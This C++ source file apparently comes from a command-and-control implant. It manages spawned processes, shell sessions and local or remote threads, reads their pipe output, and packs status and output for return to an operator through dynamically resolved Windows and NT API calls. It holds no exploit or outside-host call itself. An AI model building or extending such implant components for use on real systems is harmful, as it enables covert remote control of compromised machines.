#include "JobsController.h"
#include "ApiLoader.h"
#include <new>

JobsController* JobsController_Create()
{
	JobsController* self = (JobsController*)MemAllocLocal(sizeof(JobsController));
	new (&self->jobs) Vector<JobData>();
	return self;
}

void JobsController_Destroy(JobsController* self)
{
	if (!self)
		return;
	self->jobs.destroy();
	self->jobs.~Vector<JobData>();
	MemFreeLocal((LPVOID*)&self, sizeof(JobsController));
}

JobData JobsController_CreateJobData(JobsController* self, ULONG taskId, WORD Type, WORD State, HANDLE object, WORD pid, HANDLE input, HANDLE output)
{
    JobData jobData = { taskId, Type, State, object, pid, input, output };
	self->jobs.push_back(jobData);
	return jobData;
}

void JobsController_ProcessJobs(JobsController* self, Packer* packer)
{
	if ( !self->jobs.size() )
		return;

	for (int i = 0; i < self->jobs.size(); i++) {

        ULONG  available = 0;
		LPVOID buffer    = ReadDataFromAnonPipe(self->jobs[i].pipeRead, &available);
        if (available > 0) {
			Packer_Pack32(packer, self->jobs[i].jobId);
			Packer_Pack32(packer, COMMAND_JOB);
			Packer_Pack8(packer, self->jobs[i].jobType);
			Packer_Pack8(packer, JOB_STATE_RUNNING);
			Packer_PackBytes(packer, (BYTE*)buffer, available);
			
			MemFreeLocal(&buffer, available);
        }

		if (self->jobs[i].jobState == JOB_STATE_RUNNING) {

            ULONG status = 0;
			if (self->jobs[i].jobType == JOB_TYPE_PROCESS || self->jobs[i].jobType == JOB_TYPE_SHELL)
				ApiWin->GetExitCodeProcess(self->jobs[i].jobObject, &status);
			else if (self->jobs[i].jobType == JOB_TYPE_LOCAL || self->jobs[i].jobType == JOB_TYPE_REMOTE)
				ApiWin->GetExitCodeThread(self->jobs[i].jobObject, &status);

			if (status != STILL_ACTIVE) {
				if(self->jobs[i].jobType == JOB_TYPE_SHELL)
					self->jobs[i].jobState = JOB_STATE_KILLED;
				else
					self->jobs[i].jobState = JOB_STATE_FINISHED;
			}
		}

		if (self->jobs[i].jobState == JOB_STATE_KILLED || self->jobs[i].jobState == JOB_STATE_FINISHED) {

			if (self->jobs[i].jobType == JOB_TYPE_PROCESS || self->jobs[i].jobType == JOB_TYPE_SHELL)
				ApiNt->NtTerminateProcess(self->jobs[i].jobObject, NULL);
            else if (self->jobs[i].jobType == JOB_TYPE_LOCAL || self->jobs[i].jobType == JOB_TYPE_REMOTE)
				ApiNt->NtTerminateThread(self->jobs[i].jobObject, NULL);

			if (self->jobs[i].pipeRead) {
				ApiNt->NtClose(self->jobs[i].pipeRead);
				self->jobs[i].pipeRead = NULL;
			}
			if (self->jobs[i].pipeWrite) {
				ApiNt->NtClose(self->jobs[i].pipeWrite);
				self->jobs[i].pipeWrite = NULL;
			}

			Packer_Pack32(packer, self->jobs[i].jobId);
			Packer_Pack32(packer, COMMAND_JOB);
			Packer_Pack8(packer, self->jobs[i].jobType);
			Packer_Pack8(packer, self->jobs[i].jobState);

			self->jobs.remove(i);
			--i;
		}
	}
}

BOOL JobsController_KillJob(JobsController* self, ULONG jobId)
{
	for (int i = 0; i < self->jobs.size(); i++) {
		if (self->jobs[i].jobId == jobId) {
			self->jobs[i].jobState = JOB_STATE_KILLED;
			return TRUE;
		}
	}
	return FALSE;
}
